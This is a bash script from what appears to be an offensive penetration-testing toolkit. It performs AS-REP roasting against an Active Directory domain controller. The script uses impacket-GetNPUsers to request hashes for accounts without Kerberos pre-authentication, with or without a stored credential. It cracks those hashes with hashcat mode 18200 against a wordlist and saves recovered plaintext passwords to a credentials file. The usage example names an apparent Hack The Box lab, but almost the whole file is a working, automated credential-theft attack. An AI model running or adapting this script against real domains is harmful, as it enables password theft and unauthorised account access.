#!/usr/bin/env bash
# =============================================================================
#  asreproast.sh  —  AS-REP roast accounts without Kerberos pre-auth  (ATOMIC)
# =============================================================================
#  Attack-chain role: accounts with "do not require Kerberos preauth" set will
#  hand out an AS-REP encrypted with the user's key to anyone who asks — no
#  credential needed. Crack offline to recover the plaintext.
#
#  Two modes, chosen automatically:
#    * with a credential in creds.json → enumerate+request across the domain
#    * without one → needs -d <domain> and a -U userlist (default seclists)
#
#  Extra flags:
#    -U, --userlist <file>   users to test when running credential-less
#    -w, --wordlist <file>   hashcat wordlist (default rockyou.txt)
#    --crack / --no-crack    force / suppress cracking (default: prompt)
# =============================================================================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
SCRIPT_ARGS="$*"
source "$SCRIPT_DIR/lib/common.sh"

usage() { cat <<'EOF'
asreproast.sh — AS-REP roast (no preauth) + optional crack (ATOMIC)

USAGE:   ./asreproast.sh [-t dc] [-d domain] [-U userlist] [-w wordlist] [--crack|--no-crack] [-q]
EXAMPLE: ./asreproast.sh -d support.htb -U runs/02.../kerbrute.out --crack

FLAGS:
  -U, --userlist <file>  users to test when running WITHOUT a credential
  -w, --wordlist <file>  hashcat wordlist (default rockyou.txt)
      --crack            crack immediately, no prompt
      --no-crack         only save hashes; never prompt/crack
  -h, --help             this help
  (shared flags -t/-d/-q: --help-common)

WHAT IT DOES: impacket-GetNPUsers -request (with a cred if one is stored, else
  credential-less against the userlist) -> hashcat -m 18200; cracked passwords
  appended to creds.json.
PREREQS: either a credential in creds.json, or -d <domain> + a userlist.
EOF
}

USERLIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
WORDLIST="/usr/share/wordlists/rockyou.txt"
CRACK_MODE="ask"

parse_common_args "$@"
set -- "${COMMON_REMAINING[@]}"
while [[ $# -gt 0 ]]; do
  case "$1" in
    -U|--userlist) USERLIST="$2"; shift 2 ;;
    -w|--wordlist) WORDLIST="$2"; shift 2 ;;
    --crack)    CRACK_MODE="always"; shift ;;
    --no-crack) CRACK_MODE="never";  shift ;;
    -h|--help) usage; exit 0 ;;
    *) log_warn "ignoring unknown arg: $1"; shift ;;
  esac
done

[[ -n "$TARGET" ]] || die "no target: set scope.txt or pass -t <dc>"

log_begin
announce_loot
HASHES="$(loot_dir)/asrep.hashes"
need_cmd impacket-GetNPUsers

# Prefer an authenticated request if we have a credential; otherwise go
# credential-less against the supplied userlist.
if creds_select "$DOMAIN_OVERRIDE"; then
  DOMAIN="$(resolve_domain)"
  log_info "authenticated AS-REP roast as ${DOMAIN}/${SEL_USER} (${SEL_STYPE})"
  run_cmd "impacket-GetNPUsers -request -format hashcat -dc-ip ${DC} -outputfile '${HASHES}' $(imp_target) $(imp_secret_flags)"
else
  DOMAIN="$(resolve_domain)"
  [[ -n "$DOMAIN" ]] || die "no credential stored and no -d <domain> given — cannot roast"
  log_info "credential-less AS-REP roast against ${DOMAIN} using ${USERLIST}"
  [[ -f "$USERLIST" ]] || log_warn "userlist not found: ${USERLIST}"
  run_cmd "impacket-GetNPUsers ${DOMAIN}/ -no-pass -request -format hashcat -usersfile '${USERLIST}' -dc-ip ${DC} -outputfile '${HASHES}'"
fi

if [[ ! -s "$HASHES" ]]; then
  log_warn "no AS-REP hashes written — no preauth-disabled accounts found (or auth failed)"
  log_end "partial"; exit 0
fi
log_ok "saved $(grep -c '^\$krb5asrep' "$HASHES" 2>/dev/null || echo '?') AS-REP hash(es) to ${HASHES}"

# Crack (hashcat mode 18200 = AS-REP).
do_crack=1
case "$CRACK_MODE" in
  never) do_crack=0 ;; always) do_crack=1 ;;
  ask)   confirm "Crack the AS-REP hashes now with hashcat?" && do_crack=1 || do_crack=0 ;;
esac

if [[ "$do_crack" -eq 1 ]]; then
  need_cmd hashcat
  [[ -f "$WORDLIST" ]] || log_warn "wordlist not found: ${WORDLIST}"
  run_cmd "hashcat -m 18200 '${HASHES}' '${WORDLIST}' --quiet" || log_warn "hashcat returned non-zero"

  SHOW_CMD="hashcat -m 18200 '${HASHES}' --show"
  log_run "$SHOW_CMD"; exec_capture "$SHOW_CMD"
  found=0
  while IFS= read -r line; do
    [[ "$line" == *'$krb5asrep$'* ]] || continue
    # format: $krb5asrep$23$user@REALM:<hash>:<plain>  → user between $23$ and @
    # Locale-safe bash expansion (no grep -P \K): strip up to "$krb5asrep$",
    # then up to the next "$", then take everything before "@".
    acct="${line#*\$krb5asrep\$}"; acct="${acct#*\$}"; acct="${acct%%@*}"
    plain="${line##*:}"
    [[ -z "$plain" || "$plain" == "$line" ]] && continue
    creds_add "${DOMAIN}" "${acct:-unknown}" "password" "$plain" "AS-REP roast, $(date '+%F')"
    found=$((found+1))
  done <<< "$LAST_OUTPUT"
  log_output
  [[ "$found" -gt 0 ]] && log_ok "recovered ${found} AS-REP password(s) into creds.json" \
                        || log_warn "no plaintext recovered"
fi

log_end "success"
